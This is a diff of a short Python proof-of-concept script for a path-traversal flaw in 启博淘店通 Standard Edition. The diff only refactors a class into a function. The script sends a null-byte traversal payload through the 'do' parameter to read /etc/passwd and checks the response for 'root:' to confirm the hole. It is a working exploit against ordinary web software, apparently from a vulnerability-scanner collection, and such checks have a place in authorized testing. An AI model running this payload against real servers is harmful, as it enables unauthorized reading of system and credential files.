@@ -9,20 +9,13 @@ description: /?mod=goods&do=index&class_id=25,参数do未过滤存在任意文�
 import sys
 import requests
 import warnings
-
-
-
-class do_filedownload:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['启博淘店通标准版任意文件遍历漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/?mod=goods&do=../../../../../../../../../etc/passwd%00.jpg&class_id=25"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
@@ -37,5 +30,5 @@ class do_filedownload:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = do_filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
